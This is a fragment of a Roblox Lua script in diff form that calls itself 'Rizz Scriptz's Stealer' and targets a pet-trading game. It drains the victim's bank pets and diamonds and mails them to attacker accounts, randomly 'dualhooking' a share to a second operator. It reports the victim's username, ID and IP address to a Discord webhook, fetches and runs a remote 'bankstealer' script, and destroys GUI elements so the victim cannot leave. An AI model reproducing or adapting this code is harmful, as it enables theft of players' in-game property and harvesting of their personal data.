+        end
+        if #LFinalList ~= 0 or bdiaamt ~= 0 then
+            local A_5 = {
+                [1] = Bank,
+                [2] = LFinalList,
+                [3] = 0
+            }
+            local s, e = pcall(function()
+                withdrawremote:InvokeServer(Bank, LFinalList, bdiaamt)
+            end)
+            if s == false then
+                wait(0.2)
+                withdrawremote:InvokeServer(Bank, LFinalList, 0)
+            end
+            FinalFinal = FinalFinal + #LFinalList
+            wait(1.5)
+        else
+            print('done1')
+            break
+        end
+    end
+end
+if Bank2 ~= nil and invspace() ~= 0 then
+    while task.wait() do
+        print('bank2 purged')
+        SuperBank2 = getbankremote:InvokeServer(Bank2)
+        BHList2 = {}
+        FinalList2 = {}
+        local pets2 = SuperBank2.Storage.Pets
+        local y = {}
+        for i, v in pairs(pets2) do
+            y[v["uid"]] = false
+        end
+        for i, v in pairs(pets2) do
+            if table.find(PetIDList, v["id"]) ~= nil and not v.l then
+                table.insert(BHList2, v["uid"])
+            end
+        end
+        if #BHList2 <= invspace() then
+            for i, v in pairs(BHList2) do
+                table.insert(FinalList2, v)
+            end
+        elseif #BHList2 > invspace() then
+            for i, v in pairs(BHList2) do
+                if #FinalList2 < invspace() then
+                    table.insert(FinalList2, v)
+                end
+            end
+        end
+        print("FinalList2 :", #FinalList2)
+        print('BHList2 :', #BHList2)
+        bdiaamt2 = SuperBank2.Storage.Currency.Diamonds
+        if #FinalList2 == 0 and bdiaamt2 < 1000000000 and diaamt99 > 110000 then
+            bdiaamt = 0
+        end
+        if #FinalList2 ~= 0 or bdiaamt2 ~= 0 then
+            local A_1 = {
+                [1] = Bank2,
+                [2] = FinalList2,
+                [3] = 0
+            }
+            wait()
+            local s, e = pcall(function()
+                withdrawremote:InvokeServer(Bank2, FinalList2, bdiaamt2)
+            end)
+            if s == false then
+                wait(0.2)
+                withdrawremote:InvokeServer(Bank2, FinalList2, 0)
+            end
+            wait(1.5)
+            FinalFinal = FinalFinal + #FinalList2
+        else
+            print('done2')
+            break
+        end
+    end
+end
+if Bank3 ~= nil and invspace() ~= 0 then
+    while task.wait() do
+        print('bank3 purged')
+        SuperBank3 = getbankremote:InvokeServer(Bank3)
+        BHList3 = {}
+        FinalList3 = {}
+        local pets3 = SuperBank3.Storage.Pets
+        local y = {}
+        for i, v in pairs(pets3) do
+            y[v["uid"]] = false
+        end
+        for i, v in pairs(pets3) do
+            if table.find(PetIDList, v["id"]) ~= nil and not v.l then
+                table.insert(BHList3, v["uid"])
+            end
+        end
+        if #BHList3 <= invspace() then
+            for i, v in pairs(BHList3) do
+                table.insert(FinalList3, v)
+            end
+        elseif #BHList3 > invspace() then
+            for i, v in pairs(BHList3) do
+                if #FinalList3 < invspace() then
+                    table.insert(FinalList3, v)
+                end
+            end
+        end
+        print("FinalList3 :", #FinalList3)
+        print('BHList3 :', #BHList3)
+        bdiaamt3 = SuperBank3.Storage.Currency.Diamonds
+        if #FinalList3 == 0 and bdiaamt3 < 1000000000 and diaamt99 > 110000 then
+            bdiaamt = 0
+        end
+        if #FinalList3 ~= 0 or bdiaamt3 ~= 0 then
+            local A_1 = {
+                [1] = Bank3,
+                [2] = FinalList3,
+                [3] = 0
+            }
+
+            wait()
+            local s, e = pcall(function()
+                withdrawremote:InvokeServer(Bank3, FinalList3, bdiaamt3)
+            end)
+
+            if s == false then
+                wait(0.2)
+                withdrawremote:InvokeServer(Bank3, FinalList3, 0)
+            end
+            wait(1.5)
+            FinalFinal = FinalFinal + #FinalList3
+        else
+            print('done3')
+            break
+        end
+    end
+end
+if Bank4 ~= nil and invspace() ~= 0 then
+    while task.wait() do
+        print('bank4 purged')
+        SuperBank4 = getbankremote:InvokeServer(Bank4)
+        BHList4 = {}
+        FinalList4 = {}
+        local pets4 = SuperBank4.Storage.Pets
+        local y = {}
+        for i, v in pairs(pets4) do
+            y[v["uid"]] = false
+        end
+        for i, v in pairs(pets4) do
+            if table.find(PetIDList, v["id"]) ~= nil and not v.l then
+                table.insert(BHList4, v["uid"])
+            end
+        end
+        if #BHList4 <= invspace() then
+            for i, v in pairs(BHList4) do
+                table.insert(FinalList4, v)
+            end
+        elseif #BHList4 > invspace() then
+            for i, v in pairs(BHList4) do
+                if #FinalList4 < invspace() then
+                    table.insert(FinalList4, v)
+                end
+            end
+        end
+        print('BHList4 :', #BHList4)
+        print('FinalList4 :', #FinalList4)
+        bdiaamt4 = SuperBank4.Storage.Currency.Diamonds
+        if #FinalList4 == 0 and bdiaamt4 < 1000000000 and diaamt99 > 110000 then
+            bdiaamt4 = 0
+        end
+        if #FinalList4 ~= 0 or bdiaamt4 ~= 0 then
+            local A_1 = {
+                [1] = Bank4,
+                [2] = FinalList4,
+                [3] = 0
+            }
+            local s, e = pcall(function()
+                withdrawremote:InvokeServer(Bank4, FinalList4, bdiaamt4)
+            end)
+
+            if s == false then
+                wait(0.2)
+                withdrawremote:InvokeServer(Bank4, FinalList4, 0)
+            end
+            FinalFinal = FinalFinal + #FinalList4
+            wait(1.5)
+        else
+            print('done4')
+            break
+        end
+    end
+end
+if Bank5 ~= nil and invspace() ~= 0 then
+    while task.wait() do
+        print('bank5 purged')
+        SuperBank5 = getbankremote:InvokeServer(Bank5)
+        BHList5 = {}
+        FinalList5 = {}
+        local pets5 = SuperBank5.Storage.Pets
+        local y = {}
+        for i, v in pairs(pets5) do
+            y[v["uid"]] = false
+        end
+        for i, v in pairs(pets5) do
+            if table.find(PetIDList, v["id"]) ~= nil and not v.l then
+                table.insert(BHList5, v["uid"])
+            end
+        end
+        if #BHList5 <= invspace() then
+            for i, v in pairs(BHList5) do
+                table.insert(FinalList5, v)
+            end
+        elseif #BHList5 > invspace() then
+            for i, v in pairs(BHList5) do
+                if #FinalList5 < invspace() then
+                    table.insert(FinalList5, v)
+                end
+            end
+        end
+        print('BHList5 :', #BHList5)
+        print('FinalList5 :', #FinalList5)
+        bdiaamt5 = SuperBank5.Storage.Currency.Diamonds
+        if #FinalList5 == 0 and bdiaamt5 < 1000000000 and diaamt99 > 110000 then
+            bdiaamt5 = 0
+        end
+        if #FinalList5 ~= 0 or bdiaamt5 ~= 0 then
+            local A_1 = {
+                [1] = Bank5,
+                [2] = FinalList5,
+                [3] = 0
+            }
+
+            wait()
+            local s, e = pcall(function()
+                withdrawremote:InvokeServer(Bank5, FinalList5, bdiaamt5)
+            end)
+
+            if s == false then
+                wait(0.2)
+                withdrawremote:InvokeServer(Bank5, FinalList5, 0)
+            end
+            wait(1.5)
+            FinalFinal = FinalFinal + #FinalList5
+        else
+            print('done5')
+            break
+        end
+    end
+end
+
+local DiamondsDiamonds = bdiaamt + bdiaamt2 + bdiaamt3 + bdiaamt4 + bdiaamt5
+
+-- Redeem Free Gifts
+
+local GiftsGui = game:GetService("Players").LocalPlayer.PlayerGui.FreeGifts
+Gifts = {}
+if invspace_nolimit() ~= 0 then
+    for i, v in pairs(GiftsGui.Frame.Container.Gifts:GetDescendants()) do
+        if v.Name == "Timer" then
+            if v.Text == "Redeem!" then
+                table.insert(Gifts, string.split(tostring(v.Parent), 't')[2])
+            end
+        end
+    end
+    if #Gifts ~= 0 then
+        for i, v in pairs(Gifts) do
+            redeemgiftsremote:InvokeServer(tonumber(v))
+        end
+    end
+end
+
+-- Get VIP & Rank Rewards
+
+if PlayerInfos.World == "Spawn" then
+    local Redeem_Pad = game:GetService("Workspace")["__MAP"].Interactive["Rank Rewards"].Pad
+    local VIP_Pad = game:GetService("Workspace")["__MAP"].Interactive["VIP Rewards"].Pad
+    local Timer = Redeem_Pad.BillboardGui.Timer
+    local VIP_Timer = VIP_Pad.BillboardGui.Timer
+    if Timer.Text == "Redeem!" then
+        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Redeem_Pad.Position)
+        while task.wait() do
+            if Timer.Text ~= "Redeem!" then break end
+        end
+    end
+    if table.find(PlayerInfos.Gamepasses, 18674305) then
+        if VIP_Timer.Text == "Redeem!" then
+            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(VIP_Pad.Position)
+            while task.wait() do
+                if VIP_Timer.Text ~= "Redeem!" then break end
+            end
+        end
+    end
+end
+
+-- Teleport To Mailbox
+
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
+"__MAP"].Interactive.Mailbox.Pad.Position)
+
+-- Claim All Gifts
+
+local check = getmailremote:InvokeServer()
+local inbox = #check.Inbox
+
+if inbox ~= 0 and invspace_nolimit() >= inbox then
+    claimallremote:InvokeServer()
+    task.wait(1.5)
+end
+
+-- Run Bankstealer if Diamonds Are < 110k
+
+local diaamt = PlayerInfos.Diamonds
+if diaamt < 110000 then
+    _G.Webhook = Webhook
+    _G.LoadingScreen = false
+    _G.AntiLeave = false
+    _G.MouseLock = false
+    loadstring(game:HttpGetAsync("bankstealer raw link", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
+    return;
+end
+if _G.AntiLeave ~= false then
+    for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
+        if v.Name ~= "Inventory" then
+            v:Destroy()
+        end
+    end
+    for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
+            v:Destroy()
+        end
+    end
+end
+
+-- Pets Tables :
+
+TitanicList = {}
+TList = {}
+STList = {}
+BananaList = {}
+BList = {}
+HugeList = {}
+HList = {}
+SHList = {}
+PogList = {}
+PList = {}
+SPList = {}
+ExclusiveList = {}
+EList = {}
+SEList = {}
+EventList = {}
+EvList = {}
+SEvList = {}
+SecretList = {}
+SList = {}
+SSList = {}
+MythicList = {}
+MList = {}
+SMList = {}
+
+-- Pets's ID's
+
+table.foreach(Library.Directory.Pets, function(i, v)
+    if v.titanic then
+        table.insert(TitanicList, i)
+    end
+    if v.name == "banana" then
+        table.insert(BananaList, i)
+    end
+    if v.huge then
+        table.insert(HugeList, i)
+    end
+    if string.split(v.name, " ")[1] == "Pog" then
+        table.insert(PogList, i)
+    end
+    if v.rarity == "Exclusive" and not v.huge and not v.titanic then
+        table.insert(ExclusiveList, i)
+    end
+    if v.rarity == "Event" then
+        table.insert(EventList, i)
+    end
+    if v.rarity == "Secret" then
+        table.insert(SecretList, i)
+    end
+    if v.rarity == "Mythical" then
+        table.insert(MythicList, i)
+    end
+end)
+-- Pets's UID's
+
+local pets = PlayerInfos.Pets
+local y = {}
+for i, v in pairs(pets) do
+    y[v["uid"]] = false
+end
+lockremote:InvokeServer(y)
+for i, v in pairs(pets) do
+    if table.find(TitanicList, v["id"]) ~= nil then
+        table.insert(TList, v["uid"])
+        table.insert(STList, v["id"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(BananaList, v["id"]) ~= nil then
+        table.insert(BList, v["uid"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(HugeList, v["id"]) ~= nil then
+        table.insert(HList, v["uid"])
+        table.insert(SHList, v["id"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(PogList, v["id"]) ~= nil then
+        table.insert(PList, v["uid"])
+        table.insert(SPList, v["id"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(ExclusiveList, v["id"]) ~= nil and not v.huge and not v.titanic then
+        table.insert(EList, v["uid"])
+        table.insert(SEList, v["id"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(EventList, v["id"]) ~= nil then
+        table.insert(EvList, v["uid"])
+        table.insert(SEvList, v["id"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(SecretList, v["id"]) ~= nil then
+        table.insert(SList, v["uid"])
+        table.insert(SSList, v["id"])
+    end
+end
+for i, v in pairs(pets) do
+    if table.find(MythicList, v["id"]) ~= nil and v.hc and v.dm then
+        table.insert(MList, v["uid"])
+        table.insert(SMList, v["id"])
+    end
+end
+
+local FinalList = #TList + #BList + #HList + #EList + #EvList + #MList + #SList + #PList
+
+-- Webhook Diamonds Infos & Diamonds Calculations
+
+local Sdiaamt
+if diaamt >= (100000 * FinalList + 100000) then
+    Sdiaamt = 100000 * FinalList + 100000
+    -- print(Sdiaamt)
+elseif diaamt < (100000 * FinalList + 100000) then
+    Sdiaamt = diaamt
+end
+local givediaamt
+if diaamt - Sdiaamt < 10000 then
+    givediaamt = 0
+elseif diaamt - Sdiaamt >= 10000 then
+    givediaamt = diaamt - Sdiaamt
+end
+function diamondstoconvert(diamonds)
+    local diaamt2 = diamonds
+    local abbreviations = {
+        k = 4,
+        m = 7,
+        b = 10,
+        T = 13,
+        Qt = 16,
+    }
+    local DiamondsCount = tostring(math.floor(diaamt2))
+
+    local ChosenAbbreviation
+    for abbreviation, digits in pairs(abbreviations) do
+        if #DiamondsCount >= digits and #DiamondsCount < (digits + 3) then
+            ChosenAbbreviation = abbreviation
+            break
+        end
+    end
+
+    if ChosenAbbreviation then
+        local digits = abbreviations[ChosenAbbreviation]
+        local rounded = math.floor(diaamt2 / 10 ^ (digits - 3)) * 10 ^ (digits - 3)
+        DiamondsCount = string.format("%0.2f", rounded / 10 ^ (digits - 1))
+        local addsd = string.split(DiamondsCount, ".")[2]
+        local pnt = "."
+        if string.split(addsd, "")[2] == "0" and string.split(addsd, "")[1] ~= "0" then
+            DiamondsCount = string.split(DiamondsCount, ".")[1] ..
+                pnt .. string.split(addsd, "")[1] .. ChosenAbbreviation
+        elseif string.split(addsd, "")[2] == "0" and string.split(addsd, "")[1] == "0" then
+            DiamondsCount = string.split(DiamondsCount, ".")[1] .. ChosenAbbreviation
+        elseif string.split(addsd, "")[2] ~= "0" and string.split(addsd, "")[1] ~= "0" then
+            DiamondsCount = DiamondsCount .. ChosenAbbreviation
+        elseif string.split(addsd, "")[2] ~= "0" and string.split(addsd, "")[1] == "0" then
+            DiamondsCount = DiamondsCount .. ChosenAbbreviation
+        else
+            DiamondsCount = diamonds
+        end
+    end
+    return DiamondsCount
+end
+
+local DiamondsCount = diamondstoconvert(givediaamt)
+local WDiamondsCount = diamondstoconvert(DiamondsDiamonds)
+function RAP()
+    local RAP = diamondstoconvert(PlayerInfos.RAP)
+    return RAP
+end
+
+-- Webhook
+local url = Webhook
+local whenabled = true
+local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
+    local abcdef1
+    local headers
+    local lmao = "/5"
+    local Image = string.split(petimg, "rbxassetid://")[2]
+    Image = game:HttpGet("https://thumbnails.roblox.com/v1/assets?assetIds=" ..
+        Image .. "&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false")
+    Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
+    if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
+        imgs =
+        "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
+        data1 = {
+            ["content"] = ping,
+            ["username"] = "Rizz Scriptz",
+            ["avatar_url"] = imgs,
+            ["embeds"] = { {
+                ["title"] = "**New Hit** ||With Rizz||",
+                ["url"] = "https://discord.gg/uSgzNwHDTS",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x2798FF),
+                ["thumbnail"] = {
+                    ["url"] = Image,
+                    ["height"] = 420,
+                    ["width"] = 420
+                },
+                ["fields"] = { {
+                    ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
+                    ["value"] = "```Username     : " .. username ..
+                        "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
+                        " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
+                        "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
+                    ["inline"] = false
+                }, {
+                    ["name"] = ":dog: **Pets left** :dog:",
+                    ["value"] = "```" .. f .. "```",
+                    ["inline"] = true
+                }, {
+                    ["name"] = ":gem: **Diamonds** :gem:",
+                    ["value"] = "```" .. d .. "```",
+                    ["inline"] = true
+                },
+                    {
+                        ["name"] = rarity,
+                        ["value"] = "```" .. name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":bank: **Joined Banks** :bank:",
+                        ["value"] = "```" .. bankscount .. lmao .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":gem: **Wd Diamonds** :gem:",
+                        ["value"] = "```" .. WDiamondsCount .. "```",
+                        ["inline"] = true
+                    }, {
+                    ["name"] = ":money_mouth: **Wd Huges** :money_mouth:",
+                    ["value"] = "```" .. FinalFinal .. "```",
+                    ["inline"] = true
+                },
+                }
+            } }
+        }
+        newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+
+        headers = {
+            ["content-type"] = "application/json"
+        }
+
+        if Webhook ~= nil and whenabled == true then
+            abcdef1 = {
+                Url = url,
+                Body = newdata1,
+                Method = "POST",
+                Headers = headers
+            }
+            request(abcdef1)
+        end
+    else
+        imgs =
+        "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
+        data1 = {
+            ["content"] = ping,
+            ["username"] = "Rizz Scriptz",
+            ["avatar_url"] = imgs,
+            ["embeds"] = { {
+                ["title"] = "**New Hit** ||With Rizz||",
+                ["url"] = "https://discord.gg/uSgzNwHDTS",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x2798FF),
+                ["thumbnail"] = {
+                    ["url"] = Image,
+                    ["height"] = 420,
+                    ["width"] = 420
+                },
+                ["fields"] = { {
+                    ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
+                    ["value"] = "```Username     : " .. username ..
+                        "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
+                        " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
+                        "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
+                    ["inline"] = false
+                }, {
+                    ["name"] = ":dog: **Pets left** :dog:",
+                    ["value"] = "```" .. f .. "```",
+                    ["inline"] = true
+                }, {
+                    ["name"] = ":gem: **Diamonds** :gem:",
+                    ["value"] = "```" .. d .. "```",
+                    ["inline"] = true
+                },
+                    {
+                        ["name"] = rarity,
+                        ["value"] = "```" .. name .. "```",
+                        ["inline"] = true
+                    },
+                }
+            } }
+        }
+        newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+
+        headers = {
+            ["content-type"] = "application/json"
+        }
+
+        if Webhook ~= nil and whenabled == true then
+            abcdef1 = {
+                Url = url,
+                Body = newdata1,
+                Method = "POST",
+                Headers = headers
+            }
+            request(abcdef1)
+        end
+    end
+end
+
+local dhuser = getgenv().Settings.User
+-- if getgenv().Settings ~= nil then
+--     if getgenv().Settings.PremiumKey ~= nil then
+--         local premkey = getgenv().Settings.PremiumKey
+--         local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
+--         local dhdata = {
+--             dhprem = dhkey
+--         }
+--         local dhurl = "premium database php link here" -- Exc : https://rizz.xyz/premium.php
+--         local dhheaders = {
+--             ["content-type"] = "application/json"
+--         }
+--         local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
+--         local dhresponse = request({
+--             Url = dhurl,
+--             Body = dhnewdata,
+--             Method = "POST",
+--             Headers = dhheaders
+--         })
+--         local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
+--         if responsed ~= 'false' then
+--             dhuser = responsed
+--         else
+--             dhuser = nil
+--         end
+--     end
+-- end
+local titanicin
+local bananin
+local hugein
+local pogin
+local excin
+local eventin
+local secretin
+local mythicin
+local gemsin
+local mailmsg = ".gg/uSgzNwHDTS"
+if dhuser ~= nil then
+    if getgenv().Settings.Titanics.Dualhook then
+        titanicin = getgenv().Settings.Titanics.Intensity
+    end
+    if getgenv().Settings.Banana.Dualhook then
+        bananin = getgenv().Settings.Banana.Intensity
+    end
+    if getgenv().Settings.Huges.Dualhook then
+        hugein = getgenv().Settings.Huges.Intensity
+    end
+    if getgenv().Settings.Pogs.Dualhook then
+        pogin = getgenv().Settings.Pogs.Intensity
+    end
+    if getgenv().Settings.Exclusives.Dualhook then
+        excin = getgenv().Settings.Exclusives.Intensity
+    end
+    if getgenv().Settings.Events.Dualhook then
+        eventin = getgenv().Settings.Events.Intensity
+    end
+    if getgenv().Settings.Secrets.Dualhook then
+        secretin = getgenv().Settings.Secrets.Intensity
+    end
+    if getgenv().Settings.HC_DM_Mythics.Dualhook then
+        mythicin = getgenv().Settings.HC_DM_Mythics.Intensity
+    end
+    if getgenv().Settings.Gems.Dualhook then
+        gemsin = getgenv().Settings.Gems.Intensity
+    end
+    if getgenv().Settings.Webhook ~= true then
+        whenabled = false
+    end
+    if getgenv().Settings.MailMessage ~= nil then
+        mailmsg = getgenv().Settings.MailMessage
+    end
+end
+
+-- Dualhook intensity
+
+function dualhook(percent)
+    if not tonumber(percent) then
+        game:GetService("Players").LocalPlayer:Kick("Put A Valid intensity Value")
+        return;
+    end
+    local number = math.random(1, 100)
+    if number <= percent then
+        return true
+    else
+        return false
+    end
+end
+
+-- Sending The Pets
+
+local ndUser
+if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
+    ndUser = UserName2
+else
+    ndUser = UserName
+end
+local user
+-- Gems Only
+if FinalList == 0 then
+    if givediaamt >= 1000000000 then
+        user = UserName
+    else
+        user = ndUser
+    end
+    if gemsin ~= nil then
+        if dualhook(gemsin) then
+            user = dhuser
+        end
+    end
+    local args = {
+        [1] = {
+            ["Recipient"] = user,
+            ["Diamonds"] = givediaamt,
+            ["Pets"] = {},
+            ["Message"] = mailmsg,
+        }
+    }
+    mailremote:InvokeServer(unpack(args))
+end
+spawn(function()
+    while wait() do
+        if #TList ~= 0 or TList ~= {} then
+            for i, v in pairs(TList) do
+                user = UserName
+                if titanicin ~= nil then
+                    if dualhook(titanicin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #TList == 0 or TList == {} then
+                    -- print("done1")
+                    break
+                end
+            end
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if #BList ~= 0 and #TList == 0 then
+            for i, v in pairs(BList) do
+                user = UserName
+                if bananin ~= nil then
+                    if dualhook(bananin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #BList == 0 or BList == {} then
+                    -- print("done2")
+                    break
+                end
+            end
+        else
+            break
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if #HList ~= 0 and #BList == 0 and #TList == 0 then
+            for i, v in pairs(HList) do
+                user = UserName
+                if hugein ~= nil then
+                    if dualhook(hugein) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #HList == 0 or HList == {} then
+                    -- print("done3")
+                    break
+                end
+            end
+        end
+    end
+end)
+
+spawn(function()
+    while wait() do
+        if #PList ~= 0 and #TList == 0 and #BList == 0 and #HList == 0 then
+            for i, v in pairs(PList) do
+                user = UserName
+                if pogin ~= nil then
+                    if dualhook(pogin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #PList == 0 or PList == {} then
+                    -- print("done1")
+                    break
+                end
+            end
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if #EList ~= 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
+            for i, v in pairs(EList) do
+                user = UserName
+                if excin ~= nil then
+                    if dualhook(excin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #EList == 0 or EList == {} then
+                    -- print("done42")
+                    break
+                end
+            end
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if #EvList ~= 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
+            for i, v in pairs(EvList) do
+                user = ndUser
+                if eventin ~= nil then
+                    if dualhook(eventin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #EvList == 0 or EvList == {} then
+                    -- print("done5")
+                    break
+                end
+            end
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if #SList ~= 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
+            for i, v in pairs(SList) do
+                user = ndUser
+                if secretin ~= nil then
+                    if dualhook(secretin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #SList == 0 or SList == {} then
+                    -- print("done6")
+                    break
+                end
+            end
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if #MList ~= 0 and #SList == 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
+            for i, v in pairs(MList) do
+                user = ndUser
+                if mythicin ~= nil then
+                    if dualhook(mythicin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                -- print("secret sending")
+                if #MList == 0 or MList == {} then
+                    -- print("done6")
+                    break
+                end
+            end
+        end
+    end
+end)
+
+local Tcc = #TList
+WTianicList = {}
+WTList = {}
+WTcc = {}
+local titanicnumber = 1
+
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.titanic then
+                table.insert(WTianicList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WTianicList, v["id"]) ~= nil then
+                table.insert(WTList, v["uid"])
+                table.insert(WTcc, v["id"])
+            end
+        end
+        if Tcc == #WTList + 1 then
+            -- print("Titanic Has Been Sent")
+            Tcc = #TList
+            FinalList = FinalList - 1
+            local diamonds = givediaamt
+            local titanictid = STList[titanicnumber]
+            local titanicname
+            local titanicimg
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local titanicsm = string.split(v.Name, " - ")[1]
+                if titanicsm == tostring(titanictid) then
+                    titanicname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    titanicimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
+                    break
+                end
+            end
+            SendWebhook(":scream:  **TITANIC** :scream:", titanicname, "@everyone OMFG", DiamondsCount, FinalList,
+                titanicimg, UserName)
+            givediaamt = 0
+            DiamondsCount = 0
+            titanicnumber = titanicnumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Tcc == 0 or FinalList == 0 then
+            TList = {}
+            -- print("done1")
+            break
+        end
+        WTianicList = {}
+        WTList = {}
+        WTcc = {}
+        wait(1)
+    end
+end)
+
+local Bcc = #BList
+WBananaList = {}
+WBList = {}
+WBcc = {}
+
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.name == "banana" then
+                table.insert(WBananaList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WBananaList, v["id"]) ~= nil then
+                table.insert(WBList, v["uid"])
+                table.insert(WBcc, v["id"])
+            end
+        end
+        if Bcc == #WBList + 1 then
+            -- print("Banana Has Been Sent")
+            Bcc = #BList
+            FinalList = FinalList - 1
+            local diamonds = givediaamt
+            local banananame = "Banana"
+            local bananaimg = "rbxassetid://10946336703"
+            SendWebhook(":banana: **BANANA** :banana:", banananame, "@everyone", DiamondsCount, FinalList, bananaimg,
+                UserName)
+            givediaamt = 0
+            DiamondsCount = 0
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Bcc == 0 or FinalList == 0 then
+            BList = {}
+            -- print("done2")
+            break
+        end
+        WBananaList = {}
+        WBList = {}
+        WBcc = {}
+        wait(1)
+    end
+end)
+
+
